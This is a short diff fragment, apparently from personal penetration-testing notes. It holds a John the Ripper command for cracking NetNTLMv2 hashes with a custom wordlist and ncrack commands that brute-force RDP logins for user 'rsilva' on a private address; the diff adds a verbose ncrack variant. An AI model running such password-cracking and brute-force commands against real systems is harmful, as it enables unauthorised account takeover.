@@ -21,4 +21,7 @@ john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john
 
 ncrack -p 3389 -U <(echo rsilva) -P /home/ray_king/wordlist_personalizada_advanced.txt 192.168.1.84
 
+ncrack -v -p 3389 -U <(echo rsilva) -P /home/ray_king/wordlist_personalizada_advanced.txt 192.168.1.84
+
+
 
